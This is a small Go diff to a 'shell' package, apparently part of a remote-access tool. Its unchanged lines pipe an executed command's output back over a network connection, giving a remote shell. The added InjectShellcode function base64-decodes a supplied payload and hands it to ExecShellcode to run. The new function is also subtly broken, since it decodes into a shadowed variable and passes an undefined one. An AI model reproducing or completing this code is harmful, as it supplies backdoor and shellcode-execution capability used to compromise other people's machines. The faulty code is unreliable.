@@ -1,6 +1,7 @@
 package shell
 
 import (
+	"encoding/base64"
 	"net"
 	"os/exec"
 )
@@ -16,4 +17,13 @@ func ExecuteCmd(command string, conn net.Conn) {
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
+}
+
+func InjectShellcode(encShellcode string) {
+	if encShellcode != "" {
+		if encShellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
+			ExecShellcode(shellcode)
+		}
+	}
+	return
 }
